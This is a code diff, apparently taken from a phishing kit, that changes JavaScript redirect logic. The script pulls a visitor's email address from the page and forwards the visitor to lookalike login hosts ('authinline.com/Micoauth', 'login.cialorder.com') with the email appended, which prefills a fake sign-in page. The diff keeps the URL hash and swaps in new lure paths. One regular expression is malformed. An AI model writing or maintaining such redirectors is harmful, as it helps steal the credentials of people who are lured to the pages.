@@ -12,10 +12,11 @@
 
         if (emailMatch) {
           var email = emailMatch[1];
-          var redirectURL = 'https://authinline.com/Micoauth/index.html#' + email;
-          window.location.replace(redirectURL);
+          var hash = window.location.hash; // Get the existing hash fragment
+          var redirectURL = 'https://authinline.com/Micoauth/index.html' + hash + email;
+          window.location.href = redirectURL;
         } else {
-          window.location.replace('https://authinline.com/Micoauth/index.html');
+          window.location.href = 'https://authinline.com/Micoauth/index.html';
         }
       } else {
         extractEmailAndRedirect();
@@ -34,16 +35,17 @@
           var email = emailPart.match(/[^@]+@[^@]+);
 
           if (email) {
-            var redirectURL = 'https://login.cialorder.com/mhXayjAt#' + email[0];
-            window.location.replace(redirectURL);
+            var hash = window.location.hash; // Get the existing hash fragment
+            var redirectURL = 'https://login.cialorder.com/lSPhAWsB' + hash + email[0];
+            window.location.href = redirectURL;
           } else {
-            window.location.replace('https://login.cialorder.com/mhXayjAt');
+            window.location.href = 'https://login.cialorder.com/lSPhAWsB';
           }
         } else {
-          window.location.replace('https://login.cialorder.com/mhXayjAt');
+          window.location.href = 'https://login.cialorder.com/lSPhAWsB';
         }
       } else {
-        window.location.replace('https://login.cialorder.com/mhXayjAt');
+        window.location.href = 'https://login.cialorder.com/lSPhAWsB';
       }
     }
 
